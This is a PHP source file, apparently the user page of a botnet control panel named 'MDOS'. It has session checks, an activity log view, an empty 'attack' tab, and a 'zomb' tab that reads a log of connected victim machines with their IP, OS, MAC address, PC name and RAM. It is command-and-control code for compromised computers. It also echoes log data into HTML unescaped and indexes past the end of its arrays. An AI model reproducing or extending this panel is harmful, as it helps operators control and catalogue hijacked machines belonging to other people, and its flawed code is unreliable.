<?php
include 'static/config.php';
include 'api/core.php';
$MDOS = new MDOS;
if ((isset ($_GET["log"])) and (isset ($_GET["sid"])) and (isset ($_GET["tab"]))) {
	$info_log = $_GET["log"];
	$info_sid = $_GET["sid"];
	$info_tab = $_GET["tab"];

	if ($MDOS -> DBCheckLog($info_log)) {
		if (($MDOS -> SecureCheckSID($info_sid, $MDOS -> DBGetMDP($info_log)))==true) {
			switch ($info_tab) {
				case "log":
					if (!isset($_GET['act'])) {
						$logdata = file ("task/rawlog/rawlog.txt");
						if ($logdata != false) {
							global $htmlog;
							for($i=count($logdata);$i>0;$i--){
								$data = $logdata[$i];
								list($date, $type, $ip, $error) = explode("|", $data);
								switch ($type) {
									case "#0":
										$htmlog .= '<div class = "lowlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
									break;
									case "#1":
										$htmlog .= '<div class = "midlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
									break;
									case "#2":
										$htmlog .= '<div class = "highlevel loginfo">&nbsp;<font face = "Arial" size = "4" color ="#EEEEEE">'.$ip.'</font>&nbsp;&nbsp;&nbsp;<font face ="Arial Black" size = "4">'.$date.'</font>&nbsp;&nbsp;<font face = "Arial" size = "4">'.$error.'</font></div>';
									break;
								}
							}
						}
						else {
							$htmlog = '</br><font face = "Arial" color = "#f10400" size = "3">&nbsp;&nbsp;&nbsp;Empty log.</font>';
						}
					}
					else {
						$clearhandle = fopen('task/rawlog/rawlog.txt',"w");
						ftruncate($clearhandle,0);
						$htmlog = '</br><font face = "Arial" color = "#00bd00" size = "3">&nbsp;&nbsp;&nbsp;Log cleared.</font>';
					}
					$MDOS -> HTMLPrintUser ($info_sid, $info_log, $info_tab, $htmlog);
				break;
				case "attack":
					if (isset ($_POST["update"])) {

					}
					$MDOS -> HTMLPrintUser ($info_sid, $info_log, $info_tab);
				break;
				case "zomb":
					$logdata = file ("task/connexions/connectdumper.log");
						if ($logdata != false) {
							global $htmdat;
							for($i=count($logdata);$i>0;$i--){
								$data = $logdata[$i];
								list($ip, $lang, $localgateway, $os, $macadr, $archetype, $pcname, $ram, $ip, $sid) = explode("|", $data);
								$htmdat .= '<div class = "zombbar"></div>';
							}
						}
						else {

						}
					$MDOS -> HTMLPrintUser ($info_sid, $info_log, $info_tab, $htmdat);
				break;
			}
		}
		else {
			$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#1', 'CSRF MDOS attack attempt OR expired session. (a bad secure id given on user page)');
			$MDOS -> SecureRedirect($url.'index.php?session=0');
			exit;
		}
	}
	else {
		$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (a bad log given on user page)');
		$MDOS -> SecureRedirect ($url);
		exit;
	}
}
else {
		$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#1', 'CSRF MDOS attack attempt. (no parameters calling user page)');
		$MDOS -> SecureRedirect ($url);
		exit;
}
?>